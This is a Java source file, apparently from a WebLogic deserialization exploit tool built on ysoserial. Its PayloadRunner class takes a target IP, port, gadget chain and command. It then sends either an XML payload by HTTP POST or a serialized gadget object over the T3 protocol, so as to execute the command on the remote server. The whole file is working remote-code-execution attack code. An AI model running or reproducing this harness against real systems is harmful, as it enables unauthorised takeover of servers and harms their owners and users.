package unserWeblogic.utils;

import unserWeblogic.HTTP.HTTP;
import unserWeblogic.T3.T3;
import unserWeblogic.gadgets.ObjectPayload;
import ysoserial.Serializer;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.util.Arrays;
import java.util.concurrent.Callable;

import static unserWeblogic.utils.PayloadGenerator.UrlGenerator;
import static unserWeblogic.utils.PayloadGenerator.XMLPayloadGenerator;

public class PayloadRunner {
    public static void run(String gadget, final String ip, final String port, final String protocol, final String payloadType, final String payload) throws Exception {
        //
        if(protocol.equals("HTTP")){
            String url = UrlGenerator(gadget, ip, port);
            String content = XMLPayloadGenerator(gadget, payloadType, payload);
            HTTP.sendPost(url, content);
        } else if(protocol.equals("T3")){
            if(payloadType.equals("cmd")){
                final Class<? extends ObjectPayload> clazz = ObjectPayload.Utils.getPayloadClass(gadget);
                cmdExec((Class<? extends ObjectPayload<?>>) clazz, ip, port, protocol, payload);
            }
        }
    }

    static void cmdExec(final Class<? extends ObjectPayload<?>> clazz, final String ip, final String port, final String protocol, final String command) throws Exception {
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
            public byte[] call() throws Exception {

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                ObjectPayload.Utils.releasePayload(payload, objBefore);
                return ser;
            }});

        try {
            System.out.println(Arrays.toString(serialized));
            if(protocol.equals("T3")){
                T3.send(ip, port, serialized);
            }
//            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
